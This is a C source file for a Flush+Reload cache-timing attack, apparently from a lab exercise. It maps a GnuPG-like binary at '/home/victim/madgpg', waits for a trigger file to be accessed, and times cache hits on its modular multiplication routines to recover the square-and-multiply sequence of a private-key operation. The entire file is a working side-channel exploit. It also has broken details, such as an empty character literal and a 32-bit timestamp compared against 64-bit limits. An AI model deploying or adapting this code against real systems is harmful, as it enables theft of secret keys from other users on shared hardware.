#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size;
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_PRIVATE, file_descriptor, 0);
	if (mapping == MAP_FAILED){
		printf("mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return (void *)(((uint64_t) mapping) + offset);  // mapping will be implicitly unmapped when calling function will be exited
}

static __inline__ uint32_t rdtsc(void)
{
    uint32_t lo;
    __asm__ volatile ("rdtscp" : "=a" (lo) : : "ecx", "edx");
    return lo;
}

uint32_t flush_reload(void *p)
{
	volatile unsigned long time;    
    __asm__ volatile (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " mov r8, rax 		\n"
        " mov rax, [%1]		\n"
        " lfence            \n"
        " rdtsc             \n"
        " sub rax, r8 		\n"
        " clflush [%1] 		\n"
        : "=&a" (time)
        : "r" (p)
        : "rdx", "r8");
    return time;
}

int monitor(void *p, uint32_t period, uint64_t maxwait)
{
	uint64_t start,  global_start = rdtsc();
	while (rdtsc() - global_start < maxwait)
	{	
		start = rdtsc();
		if (flush_reload(p) < 100){
			return 1;
		} 	
		while(rdtsc() - start < period);
	}
	return 0;
}


void fr_trace(void *p0, void *p1, void *p2, void *p3, uint32_t period, uint32_t *trace)
{
	uint32_t start; 
	for(int i=0; !monitor(p0, period, period); i++) // repeat count times
	{
		start = rdtsc();
		trace[3*i] = flush_reload(p1); // probe p1
		trace[3*i+1] = flush_reload(p2); // probe p2
		trace[3*i+2] = flush_reload(p3); // probe p3
		while(rdtsc() - start < period); // wait period 
	}
}



#define PERIOD 1000
#define MAXWAIT 10000000000
#define ACCELERATOR 1000000000
#define BUFFER 1000000

int main(){
	// input validation
	putchar('');
	char *filename_madgpg = "/home/victim/madgpg";
	char *filename_trigger = "/home/victim/trigger";
	uint64_t offset1 = 0xd57ed; // sqr mod
	
	uint64_t offset_mpihelp_mul_karatsuba_case = 0xdb74b; // mpihelp_mul_karatsuba_case
	uint64_t offset_mpihelp_mul = 0xdbae8;// mpihelp_mul
	
	// mpih_sqr_n_basecase
	// mpih_sqr_n
	
	
	uint64_t offset2 = 0xd571f; // mul_mod
	void *p_trigger = map(filename_trigger, 0);
	//void *p_sqr_mod = map(filename_madgpg, offset1);
	void *p_mul_mod = map(filename_madgpg, offset2);	
	void *p_mpihelp_mul_karatsuba_case = map(filename_madgpg, offset_mpihelp_mul_karatsuba_case);
	void *p_mpihelp_mul = map(filename_madgpg, offset_mpihelp_mul);	
	printf("\nmmapped files and calculated absolute adrs of functions! Waiting for trigger...\n");

	uint64_t start = rdtsc();
	while(rdtsc()-start < ACCELERATOR); // 
	uint32_t traces[3*BUFFER] = {0};
	
	// monitor trigger	
	while(!monitor(p_trigger, PERIOD, MAXWAIT)); // wait for activity (access to trigger)
	printf("detected trigger access! start monitoring square and multiplication operations!\n");
	
	// trace sqr, mul, monitor trigger
	fr_trace(p_trigger, p_mul_mod, p_mpihelp_mul_karatsuba_case, p_mpihelp_mul, PERIOD, traces);
	
	printf("detected trigger access! finished monitoring square and multiplication operations!\n");

	// print
	printf("printing operations...\n");
	int hitcounter1=0, hitcounter2=0, hitcounter3=0;
	for (int i=0;i<BUFFER;i++) {
		if (traces[3*i] <200) hitcounter1++;
		if (traces[3*i+1] <200) hitcounter2++;
		if (traces[3*i+2] <200) hitcounter3++;
		if (traces[3*i] !=0 || traces[3*i+1] !=0) printf("%4u %4u %4u\n", traces[3*i], traces[3*i+1], traces[3*i+2]);
	}
	printf("total hits %i\n%i\n%i\n", hitcounter1, hitcounter2, hitcounter3);

	return 0; // finish programm, unmap mapping
}